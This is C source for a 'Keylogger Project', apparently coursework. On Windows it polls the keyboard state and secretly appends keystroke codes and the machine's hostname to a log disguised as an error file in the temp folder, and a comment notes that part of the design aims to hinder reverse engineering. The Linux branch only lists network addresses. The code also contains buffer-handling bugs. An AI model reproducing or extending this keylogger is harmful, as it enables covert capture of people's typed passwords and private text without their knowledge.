// 315 Keylogger Project
#include <stdio.h>
#include <stdlib.h>

// If on linux
#if defined (__linux)
  #include <arpa/inet.h>
  #include <sys/socket.h>
  #include <netdb.h>
  #include <ifaddrs.h>
  #include <unistd.h>
  #include <linux/if_link.h>
  int main(int argc, char *argv[]){
    printf("Compiled on linux?\n");
    struct ifaddrs *ifaddr, *ifa;
    int family, s, n;
    char host[NI_MAXHOST];
    if(getifaddrs (&ifaddr) == -1){
        perror ("getifaddrs");
        exit (EXIT_FAILURE);
      }

    // Walk through linked list, maintaining head pointer so we can free list later
    for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++){
      if (ifa->ifa_addr == NULL){
        continue;
      }
      family = ifa->ifa_addr->sa_family;
      // For an AF_INET* interface address, display the address
      if (family == AF_INET || family == AF_INET6){
        s = getnameinfo (ifa->ifa_addr,(family == AF_INET) ? sizeof (struct sockaddr_in) : sizeof (struct sockaddr_in6), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
        printf ("address: <%s>\n", host);
      }
    }
    freeifaddrs(ifaddr);
    exit(EXIT_SUCCESS);
  }
// Windows - The main program
#elif defined (_WIN32)

  #define LOGFILE "%temp%\\ErrorLog.txt"
  #include <Windows.h>
  #include <winsock.h>
  #pragma comment(lib, "User32.lib")


  // Global variables
  char vk_string[4];
  BOOL stand = FALSE;
  BOOL invalid = FALSE;

  // Key code processing
  void process_vKey(int vk){
    stand = FALSE;
    invalid = FALSE;
    //A-Z only
    if ( vk > 38 && vk < 91 || vk == 32){
      printf("[*] Key pressed %c with keycode %i\n", vk, vk);
      sprintf(vk_string, "%d", vk);

      stand = TRUE;
    }
    else if (vk == 13){
      sprintf(vk_string, "%d", vk);
      printf("[!] Key pressed [ENTER] with keycode %i\n", vk);
    }
    else{
      printf("[*] Invalid keycode code: %i \n", vk);
      invalid = TRUE;
    }
  }

  // Main windows function
  int main(){
    TCHAR logFile[MAX_PATH] = { 0 };
  	ExpandEnvironmentStrings(LOGFILE, logFile, _countof(logFile));

    char cName[MAX_COMPUTERNAME_LENGTH + 1]; //need to allocate space
    DWORD len = 55;//needs DWORD
    if(GetComputerName(cName, &len) != 0) {
      char host[sizeof(cName)+10];
      strcpy(host, "Hostname: ");
      strcat(cName, "\n");
      strcat(host, cName);
      printf("[*] %s",host);

      FILE *file = NULL;
      fopen_s(&file, logFile, "a+");
      fwrite(host, sizeof(host), 1, file);
      fclose(file);
    }
    else {
      printf("[-] Error: could not get hostname");
    }

    int last_vKey = 0;
  	while (1){
  		for (int vKey = 3; vKey < 100; ++vKey)
  		{
  			if (GetAsyncKeyState(last_vKey) != 0)
  				continue;

  			last_vKey = vKey;

        // https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getasynckeystate
  			if (GetAsyncKeyState(vKey) != 0)
  			{
  				last_vKey = vKey;

          // Open text file with create or append
          FILE *file = NULL;
          fopen_s(&file, logFile, "a+");

          // Process vkey
          process_vKey(vKey);

          // Append newline to keycode and makes it harder to RE
          char src[4];
          char dest[4];
          strcpy(src, vk_string);
          strcpy(dest, "\n");
          strcat(src, dest);

          fwrite(src, sizeof(src), 1, file);
          fclose(file);

  			}
  		}
  	}
  }
#elif
    // If windows or linux is not defined
    int main(){
      printf("[-] Error while compiling... incompatable os\n");
      exit(0);
    }

#endif
